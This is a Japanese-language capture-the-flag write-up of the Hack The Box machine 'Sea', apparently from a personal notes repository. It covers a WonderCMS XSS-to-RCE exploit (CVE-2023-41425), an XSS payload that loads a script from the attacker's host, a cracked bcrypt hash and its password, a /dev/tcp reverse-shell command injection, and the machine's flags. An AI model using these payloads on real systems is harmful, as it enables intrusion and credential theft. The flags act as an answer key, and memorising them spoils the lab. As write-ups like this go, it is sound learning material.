
![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy 
- OS : #Linux 
- Machine Author(s): [FisMatHack](https://app.hackthebox.com/users/1076236)
- Hack Date: 2024-12-28,01:36


# Enumeration
- 22番と80番が空いてる
- webサーバーは、Apache/2.4.41 (Ubuntu)
```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Cookieある
	- 単純だったら、sessionとか偽装できるかな？
	- いや、更新するたびに変わってるので無理そう
- JQuery1.12.4
- Bootstrap 3.3.7
	- これはなんだ
	- BootstrapとはWEB画面を作るときに便利なCSSフレームワークの一つとのこと
```bash
[*] whatweb http://sea.htb
http://sea.htb [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.121.204], JQuery[1.12.4], Script, Title[Sea - Home], X-UA-Compatible[IE=edge]

```

dirbuster
- 404だけどhome気になるな
- `http://sea.htb/how-to-participate`の中に、`http://sea.htb/contact.php`があった
- `http://sea.htb/contact.php`の画像
- ![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-28%2021.07.49.png)
```bash
[12:58:44] Starting: 
[12:59:04] 301 -  228B  - /data  ->  http://sea.htb/data/
[12:59:08] 301 -  231B  - /plugins  ->  http://sea.htb/plugins/
[12:59:09] 200 -    1KB - /404
[12:59:13] 301 -  232B  - /messages  ->  http://sea.htb/messages/
[12:59:14] 404 -    3KB - /Home
[12:59:15] 301 -  230B  - /themes  ->  http://sea.htb/themes/
[12:59:20] 403 -  199B  - /Reports%20List
[12:59:23] 403 -  199B  - /external%20files
[12:59:36] 403 -  199B  - /Style%20Library
[12:59:40] 403 -  199B  - /server-status
[12:59:46] 403 -  199B  - /modern%20mom
[12:59:46] 403 -  199B  - /neuf%20giga%20photo
[13:00:29] 404 -    3KB - /HOME
[13:00:35] 403 -  199B  - /Web%20References
[13:00:43] 403 -  199B  - /My%20Project
[13:00:59] 403 -  199B  - /Contact%20Us
[13:01:16] 403 -  199B  - /Donate%20Cash
[13:01:17] 403 -  199B  - /Home%20Page
[13:01:21] 403 -  199B  - /Planned%20Giving
[13:01:21] 403 -  199B  - /Press%20Releases
[13:01:21] 403 -  199B  - /Privacy%20Policy
[13:01:22] 403 -  199B  - /Site%20Map
[13:01:23] 404 -    3KB - /_home
[13:01:41] 403 -  199B  - /About%20Us
[13:01:41] 403 -  199B  - /Bequest%20Gift
[13:01:43] 403 -  199B  - /Gift%20Form
[13:01:44] 403 -  199B  - /Life%20Income%20Gift
[13:01:45] 403 -  199B  - /New%20Folder
[13:01:46] 403 -  199B  - /Site%20Assets
[13:01:47] 403 -  199B  - /What%20is%20New
[13:01:53] 403 -  199B  - /besalu%09
[13:02:00] 403 -  199B  - /error%1F_log
[13:02:35] 404 -    3KB - /~home

Task Completed

```

Bootstrap 3.3.7自体に脆弱性はないのか、searcsploitでチェック
- 特に出てこない
```bash
└──╼ [★]$ searchsploit Bootstrap
---------------------------------------------------------------------------------
 Exploit Title                                                                                                                                  |  Path
---------------------------------------------------------------------------------
Bootstrapy CMS - Multiple SQL Injection             php/webapps/46590.txt
e107 2 Bootstrap CMS - Cross-Site Scripting         php/webapps/35679.txt
---------------------------------------------------------------------------------
```


Feroxbuster
- いくつかのテーマが使われてるっぽい
	- テーマの中で脆弱性あるものとかあるかな
		- bikeというテーマ
		- `http://sea.htb/themes/bike/version`
			- 3.2.0と表示される
		- `http://sea.htb/themes/bike/summary`
			- 「Animated bike theme, providing more interaction to your visitors.」と表示
			- 上の文章について検索をすると、[wondercmsのCDNファイルのgithub](https://github.com/WonderCMS/wondercms-cdn-files/blob/main/wcms-modules.json)が出てくる。
				- 具体的には、表示された文はwcms-modules.jsonの中の"summary"の文に一致する。
				- 同じくバージョンも一致する。
wcms-modules.json内の該当部分の抜粋
```json
...
        "bike": {
            "name": "Bike",
            "repo": "https://github.com/robiso/bike/tree/master",
            "zip": "https://github.com/robiso/bike/archive/master.zip",
            "summary": "Animated bike theme, providing more interaction to your visitors.",
            "version": "3.2.0",
            "image": "https://raw.githubusercontent.com/robiso/bike/master/preview.jpg"
        },
...
```
- このことから、サイトはWonder CMSのbikeというテーマを使用していることがわかる。

- 「wonder cms bike theme vulnerability」でgoogle検索すると、こんなCVEが出てくる
- 1. [CVE-2023-41425](https://www.cve.org/CVERecord?id=CVE-2023-41425)
	- WonderCMS のクロスサイトスクリプティングの脆弱性
	- このXSSの脆弱性からRCEを行えるそう。
- https://github.com/duck-sec/CVE-2023-41425
- このPoCが使える条件を確認する
	- WonderCMSサイトにログインするURL
	- ログインするURLなんてあったっけ？

pluginsも気になる
- 403 Forbiddenでアクセスできない
```bash
301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/
301      GET        7l       20w      232c http://sea.htb/messages => http://sea.htb/messages/
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
404      GET        0l        0w     3341c http://sea.htb/themes/submit-form
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
[####################] - 3m    180012/180012  0s      found:9       errors:2345   
[####################] - 3m     30000/30000   191/s   http://sea.htb/ 
[####################] - 3m     30000/30000   192/s   http://sea.htb/themes/ 
[####################] - 3m     30000/30000   193/s   http://sea.htb/data/ 
[####################] - 3m     30000/30000   195/s   http://sea.htb/plugins/ 
[####################] - 3m     30000/30000   198/s   http://sea.htb/messages/ 
[####################] - 2m     30000/30000   201/s   http://sea.htb/themes/bike/  
```



# Foothold

- [CVE-2023-41425のPoC](https://github.com/prodigiousMind/CVE-2023-41425/tree/main)を使用する
	- HTBのマシン自体がインターネットに接続されていないらしく、HTBのマシン側にインターネットからファイルをダウンロードさせることができない。なので、少しHTB用に追加操作・修正が必要になる。

- リバースシェルを含むmain.zipのダウンロード 
```bash
wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
```

- exploit.pyのダウンロード
```bash
wget https://raw.githubusercontent.com/prodigiousMind/CVE-2023-41425/refs/heads/main/exploit.py
```

- exploit.pyには2箇所、変更が必要。
- **オリジナル**
	- `var urlWithoutLogBase = new URL(urlWithoutLog).pathname;` 
- **修正後**
	- `var urlWithoutLogBase = "http://sea.htb";`

- **オリジナル**
	- `var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;`
- **修正後**
	- `var urlRev = urlWithoutLogBase+"/?installModule=http://<ATTACKER_IP>:8000/main.zip&directoryName=violet&type=themes&token=" + token;`


[CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425)のPoCが行う流れ
1.  xss.jsを作成する
	- xss.jsの役割
		- リバースシェルのダウンロードと実行
2. xss.jsを管理者に送る
	- XSSで送る

XSSスクリプト
```bash
http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.43:8000/xss.js"></script><form+action="
```
- `index.php?page=LoginURL`
    - 攻撃対象となる管理者がログインしているページを指定。
	- `"></form><script+src="http://10.10.14.43:8000/xss.js"></script><form+action="`
	    - クエリパラメータ内に意図的に不正なHTMLタグとJavaScriptコードを挿入。
	- **`"></form>`**:
	    - タグを閉じることで、現在のHTML構造を強制的に終了。
	- **`<script+src="http://10.10.14.43:8000/xss.js"></script>`**:
	    - 管理者のブラウザに攻撃者のサーバー上にあるJavaScriptファイル（`xss.js`）を読み込ませる。
	    - 管理者権限を利用して攻撃を実行する。
	- **`<form+action="`**:
	    - フォーム構造を再度挿入してページの動作を維持する。

`http://sea.htb/contact.php`のwebsiteの欄にXSSを仕掛ける
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-28%2022.28.18.png)

3. xss.jsを管理者が実行する。
4. xss.jsが実行され、リバースシェルが実行される。
	- xss.jsが行ってること
		- ページから管理者のCSRFトークンを取得。
			- WonderCMSはインストール操作などを保護するためにCSRFトークンを使用している。
		- リバースシェルをインストール
			- `installModule` パラメータを使用し、`http://10.10.14.43:8000/main.zip` からファイルをダウンロードさせる。
			-  `directoryName` を指定して、`violet` という名前でテーマをインストール。
		- リバースシェルを実行
			- サーバー上で `rev.php` を呼び出すことでリバースシェルを起動。
			- 攻撃者の指定したIPアドレス（`10.10.14.43`）とポート（`4444`）に接続。

というわけで、XSSからのRCEでリバースシェルできた。
シェルをアップデート
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

www-dataとしてログインした。
 Apache サーバーの Web 管理者 アカウントである。
user.txtは、amayユーザーが持っているらしく、権限がないので見れない。
```bash
www-data@sea:/$ cat /home/amay/user.txt
cat /home/amay/user.txt
cat: /home/amay/user.txt: Permission denied

```



# Lateral Movement

www-dataは、 Apache サーバーの Web 管理者として、`/var/www`にアクセスできる。
```bash
www-data@sea:/var/www/sea$ ls -la
ls -la
total 128
drwxr-xr-x 6 www-data www-data  4096 Feb 22  2024 .
drwxr-xr-x 4 root     root      4096 Aug  1 12:28 ..
-rwxr-xr-x 1 www-data www-data   238 Feb 21  2024 .htaccess
-rwxr-xr-x 1 www-data www-data  3521 Feb 21  2024 contact.php
drwxr-xr-x 3 www-data www-data  4096 Feb 22  2024 data
-rwxr-xr-x 1 www-data www-data 96604 Feb 22  2024 index.php
drwxrwxr-x 2 www-data www-data  4096 Dec 28 13:21 messages
drwxr-xr-x 2 www-data www-data  4096 Feb 21  2024 plugins
drwxr-xr-x 4 www-data www-data  4096 Dec 28 13:21 themes

```

`var/www`にアクセスすると、資格情報を含むデータベースのdatabase.jsがある。

パスワードは、先頭が`$2y$` であることからbcryptであることがわかる。
- `$10$`: ハッシュ処理の計算上の難しさを表すコスト パラメータ
- 次の22文字（`iOrk210RQSAzNCx6Vyq2X.`）がソルト
- ソルトの後の文字列の残りが、実際のハッシュ化されたパスワード
```bash
cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
 ...
```

パスワードのハッシュをjohnで解析する。
ハッシュの中の/がエスケープ(\/)を外すのが重要。

準備
```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash
sudo gunzip /usr/share/wordlists/rockyou*
```

実行結果、パスワードは「mychemicalromance」だとわかった
```bash
└──╼ [★]$ john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mychemicalromance (?)     
1g 0:00:00:31 DONE (2024-12-28 08:23) 0.03171g/s 97.05p/s 97.05c/s 97.05C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

amayに昇格
```bash
www-data@sea:/var/www/sea/data$ su amay
su amay
Password: mychemicalromance

amay@sea:/var/www/sea/data$ 
```


# Privilege Escalation
linpeas.shを実行
ローカルの8080が空いている。
```bash
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:48215         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   


```
SSHポートフォワーディングして、接続する。
- SSHポートフォワーディング
	- SSH接続を利用してリモートマシンまたはローカルマシン上の特定のポートに安全にアクセスする方法
	- 下のコマンドは、**ローカルポートフォワーディング**
	- リモートサーバー上のウェブサーバー (ポート8080) にローカルのポート8888を通じてアクセスする
	- `8888`: ローカルマシンのポート。
	- `127.0.0.1:8080`: リモートサーバー上のウェブサーバーが動作しているポート。
	- ローカルマシンで `http://127.0.0.1:8888` にアクセスすると、リモートのウェブサーバーが表示される。

```bash
ssh -L 8888:localhost:8080 amay@sea.htb
```
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-29%200.01.13.png)


`log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=`を`%2root%2root.txt`に変更したとき
うまくいかない
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-29%200.08.00.png)



コマンドインジェクションの形で、リバースシェルを追加する
`;bash -c 'bash -i >& /dev/tcp/10.10.14.43/1234 0>&1'`を追加した。
 - `;sh -i >& /dev/tcp/10.10.14.43/1234 0>&1`だと上手くいかなかった
	 - `bash -c` を使用すると、コマンドを明示的に `bash` シェルで実行するため、`>&` の構文を確実に解釈してくれるから？`
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/Pasted%20image%2020241229002901.png)

```bash
└──╼ [★]$ sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.253.43] 33586
bash: cannot set terminal process group (32615): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring# cat /root/root.txt
cat /root/root.txt
519d6d02d941c286ce36825ac666606a
root@sea:~/monitoring# exit

```



## Flags

- **User**: b4876ae43950e08907914a4fce0967b1
- **Root**: 519d6d02d941c286ce36825ac666606a

### ポイント

- www-dataは、 Apache サーバーの Web 管理者として、`/var/www`にアクセスできる。
- ハッシュをjohnで解析するときは、ハッシュの中の/がエスケープ(\/)を外すのが重要。

## 参考文献
引用していない参考文献
- [# Beginner’s Guide to Conquering Sea on HackTheBox](https://thecybersecguru.com/ctf-walkthroughs/mastering-sea-beginners-guide-from-hackthebox/)
- [# 【HackTheBox】Sea：Writeup](https://qiita.com/kk0128/items/200edf02b2f460f01e9e?utm_campaign=post_article&utm_medium=twitter&utm_source=twitter_share)